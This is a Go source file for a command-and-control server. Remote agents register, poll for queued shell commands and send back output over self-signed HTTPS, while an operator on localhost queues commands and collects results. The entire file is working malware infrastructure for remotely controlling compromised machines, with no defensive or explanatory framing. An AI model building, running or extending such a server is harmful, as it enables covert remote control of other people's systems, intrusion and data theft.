package main

import (
	"io"
	"log"
	"os"
	"crypto/tls"
	"crypto/rsa"
	"crypto/rand"
	"crypto/x509"
	"encoding/pem"
	mathrand "math/rand"
	"time"
	"strings"
	"net/http"
	"encoding/gob"
	"github.com/gorilla/mux"
	"github.com/wolfeidau/golang-self-signed-tls"
)

// Settings
const letters = "abcdefghijklmnopqrstuvwxyz"
const agentFile = "/opt/agents.gob"
const privKeyPath = "/opt/priv.pem"
const pubKeyPath = "/opt/public.pem"
const logPath = "/opt/logs.txt"
const listenAddr = "0.0.0.0:443"

type agent struct {
	Name string
	Address string
	Commands []string
	CommandOutput []string
}

var agents map[string]*agent

// Generates a random name with global letters
func generateName() string {
	name := make([]byte, 9)
	for i := range name {
		name[i] = letters[mathrand.Int63() % int64(len(letters))]
	}
	return string(name)
}

// Helper function to generate pem
func generateKeypair() error {
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return err
	}

	pubKey := &privKey.PublicKey

    privKeyBytes := x509.MarshalPKCS1PrivateKey(privKey)
    privKeyBlock := &pem.Block{
        Type:  "RSA PRIVATE KEY",
        Bytes: privKeyBytes,
    }
	privPem, err := os.Create(privKeyPath)
	if err != nil {
		return err
	}

	err = pem.Encode(privPem, privKeyBlock)
	if err != nil {
		return err
	}

    pubKeyBytes, err := x509.MarshalPKIXPublicKey(pubKey)
	if err != nil {
		return err
	}
    pubKeyBlock := &pem.Block{
        Type:  "PUBLIC KEY",
        Bytes: pubKeyBytes,
    }
	pubPem, err := os.Create(pubKeyPath)
	if err != nil {
		return err
	}

	err = pem.Encode(pubPem, pubKeyBlock)
	if err != nil {
		return err
	}
	return nil
}

// Loads agent info from filesystem
func loadAgents() error {
	file, _ := os.Open(agentFile)
	decoder := gob.NewDecoder(file)
	err := decoder.Decode(&agents)
	if err != nil {
		return err
	}
	file.Close()
	return nil
}

// Update agent info to filesystem
func updateAgents() {
	file, err :=  os.Create(agentFile)
	if err != nil {
		log.Println(err.Error())
	}

	gob.NewEncoder(file).Encode(agents)
	file.Close()
}

// Helper function for gettinf fields
func getField(req *http.Request, field string) string {
	vars := mux.Vars(req)
	return vars[field]
}

// Checks if a agent is communicating from a new IP address
func updateAddress(name string, remoteAddr string) {
	address := strings.Split(remoteAddr, ":")[0]
	if agents[name].Address != address {
		agents[name].Address = address
	}
}

// Private route to add command to command queue
func AddCommand(w http.ResponseWriter, req *http.Request) {
	if strings.Split(req.RemoteAddr, ":")[0] != "127.0.0.1" {
		log.Println("AddCommand: an unauthorized connection from", req.RemoteAddr, "was ignored")
		return
	}
	if req.Method != "POST" {
		io.WriteString(w, "METHOD NOT ALLOWED")
	}


	name := getField(req, "name")
	if _, ok := agents[name]; !ok {
		log.Println("AddCommand: agent with name", name, "is not found")
		return
	}

	if err := req.ParseForm(); err != nil {
		return
	}
	command := string(req.FormValue("command"))

	agents[name].Commands = append(agents[name].Commands, command)

	updateAgents()
	io.WriteString(w, name + " " + string(command))

	log.Println("added command (" + command + ") for", name)
}

// Private route to get command output
func GetOutput(w http.ResponseWriter, req *http.Request) {
	if strings.Split(req.RemoteAddr, ":")[0] != "127.0.0.1" {
		log.Println("GetOutput: an unauthorized connection from", req.RemoteAddr, "was ignored")
		return
	}
	if req.Method != "GET" {
		io.WriteString(w, "METHOD NOT ALLOWED")
	}

	name := getField(req, "name")
	if _, ok := agents[name]; !ok {
		log.Println("GetOutput: agent with name", name, "is not found")
		return
	}

	if len(agents[name].CommandOutput) == 0 {
		log.Println("an unauthorized connection from", req.RemoteAddr, "was ignored")
		io.WriteString(w, "NO RESULTS")
		return
	}

	result := agents[name].CommandOutput[0]
	agents[name].CommandOutput = agents[name].CommandOutput[1:]
	updateAgents()

	io.WriteString(w, result)
	log.Println("served (" + result + ") to administrator")
}

// Public route to serve commands to agents
func GetCommand(w http.ResponseWriter, req *http.Request) {
	if req.Method != "GET" {
		return
	}
	name := getField(req, "name")
	if _, ok := agents[name]; !ok {
		log.Println("GetCommand: agent with name", name, "is not found")
		return
	}
	updateAddress(name, req.RemoteAddr)
	if len(agents[name].Commands) == 0 {
		log.Println("agent with name", name, "has no commands in queue")
		return
	}

	command := agents[name].Commands[0]

	agents[name].Commands = agents[name].Commands[1:]
	updateAgents()

	io.WriteString(w, command)
	log.Println("served (" + command + ") to", name)
}

// Public route to assign names to agents
func RegisterAgent(w http.ResponseWriter, req *http.Request) {
	if req.Method != "GET" {
		return
	}
	name := generateName()
	newAgent := agent{Name: name, Address: strings.Split(req.RemoteAddr, ":")[0], Commands: make([]string, 0), CommandOutput: make([]string, 0)}

	agents[name] = &newAgent
	updateAgents()

	log.Println("added", name, req.RemoteAddr, "to agent pool")
	io.WriteString(w, name)
}

// Public route to retrieve errors from agents
func ReturnError(w http.ResponseWriter, req *http.Request) {
	if req.Method != "POST" {
		return
	}
	if err := req.ParseForm(); err != nil {
		return
	}

	outputErr := req.FormValue("error")
	name := getField(req, "name")
	if _, ok := agents[name]; !ok {
		log.Println("ReturnError: agent with name", name, "is not found")
		return
	}
	updateAddress(name, req.RemoteAddr)

	agents[name].CommandOutput = append(agents[name].CommandOutput, outputErr)
	updateAgents()

	log.Println("agent with name", name, "returned error of (" + outputErr + ")")
}

// Public route to retrieve output from agents
func ReturnOutput(w http.ResponseWriter, req *http.Request) {
	if req.Method != "POST" {
		return
	}
	if err := req.ParseForm(); err != nil {
		return
	}

	output := req.FormValue("output")
	name := getField(req, "name")
	if _, ok := agents[name]; !ok {
		log.Println("ReturnOutput: agent with name", name, "is not found")
		return
	}
	updateAddress(name, req.RemoteAddr)

	agents[name].CommandOutput = append(agents[name].CommandOutput, output)
	updateAgents()

	log.Println("agent with name", name, "returned output of (" + output + ")")
}

// Public route to server public key for encryption
func ServePubkey(w http.ResponseWriter, req *http.Request) {
	if req.Method != "GET" {
		return
	}
	if _, err := os.Stat(pubKeyPath); os.IsNotExist(err) {
		err := generateKeypair()
		if err != nil {
			log.Println("there was a problem generating keypairs")
			return
		}
	}

	content, err := os.ReadFile(pubKeyPath)
	if err != nil {
		log.Println("cannot read public key path", pubKeyPath)
		return
	}
	log.Println("served public key to", req.RemoteAddr)
	io.WriteString(w, string(content))
}

func main() {
	file, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		log.Fatal("unable to open logfile", err)
	}
	log.SetOutput(file)

	if _, err := os.Stat(agentFile); err == nil {
		err := loadAgents()
		if err != nil {
			log.Fatal(err)
		}
		log.Println("loaded agents from", agentFile)
	} else {
		agents = make(map[string]*agent)
		log.Println("creating agents")
	}

	mathrand.Seed(time.Now().UnixNano())
	router := mux.NewRouter()
	log.Println("starting webserver", listenAddr)

	router.HandleFunc("/register", RegisterAgent)
	router.HandleFunc("/{name}/addCommand", AddCommand)
	router.HandleFunc("/{name}/getOutput", GetOutput)
	router.HandleFunc("/{name}/getCommand", GetCommand)
	router.HandleFunc("/{name}/returnError", ReturnError)
	router.HandleFunc("/{name}/returnOutput", ReturnOutput)
	router.HandleFunc("/pubkey", ServePubkey)

	result, err := selfsigned.GenerateCert(
		selfsigned.Hosts([]string{"127.0.0.1", "localhost"}),
		selfsigned.RSABits(4096),
		selfsigned.ValidFor(365*24*time.Hour),
	)

	cert, err := tls.X509KeyPair(result.PublicCert, result.PrivateKey)
	if err != nil {
		log.Fatal("unable to open ssl certificate files")
	}

	srv := &http.Server{
		Handler: router,
		Addr:    listenAddr,
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{ cert },
		},
	}

	log.Fatal(srv.ListenAndServeTLS("", ""))
}
